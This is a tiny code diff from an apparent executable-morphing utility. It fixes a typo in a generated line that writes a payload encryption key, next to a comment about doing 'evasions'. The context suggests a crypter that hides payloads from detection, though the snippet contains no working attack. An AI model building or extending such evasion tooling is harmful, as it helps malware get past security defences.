@@ -666,7 +666,7 @@ namespace Exe_Morphing_Util
            
             fs.Seek(1035, SeekOrigin.Current);
             sw.Write("                                               ");
-            sw.WriteLine("int crytptkey = " + payloadcryptkey + ";");
+            sw.WriteLine("int cryptokey = " + payloadcryptkey + ";");
             // now we do our evasions
             fs.Seek(1736, SeekOrigin.Begin);
            
